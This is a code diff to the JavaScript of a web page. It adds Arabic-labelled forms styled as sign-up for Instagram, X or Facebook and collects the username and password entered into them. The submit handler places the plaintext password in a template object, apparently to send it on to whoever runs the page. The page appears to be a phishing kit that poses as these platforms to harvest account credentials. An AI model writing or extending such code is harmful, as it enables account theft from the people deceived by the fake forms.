@@ -12,16 +12,33 @@ function toggleLanguage(lang) {
     document.documentElement.lang = lang;
 }
 
+// Show form based on selected platform
+function showForm(platform) {
+    const formContainer = document.getElementById("form-container");
+    const platformName = document.getElementById("platform-name");
+    
+    // Set the platform name in the form header
+    platformName.textContent = platform === 'instagram' ? 'التسجيل في إنستغرام' : 
+                               platform === 'x' ? 'التسجيل في إكس' : 
+                               'التسجيل في فيسبوك';
+    
+    // Display the form container
+    formContainer.style.display = 'block';
+    
+    // Store the selected platform for later use
+    formContainer.setAttribute('data-platform', platform);
+}
+
 // Handle form submission
 document.getElementById("registration-form").addEventListener("submit", (event) => {
     event.preventDefault();
 
-    const platformName = document.getElementById('platform-name').textContent.trim();
+    const platform = document.getElementById('form-container').getAttribute('data-platform');
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
     const templateParams = {
-        platform: platformName,
+        platform: platform,
         username: username,
         password: password
     };
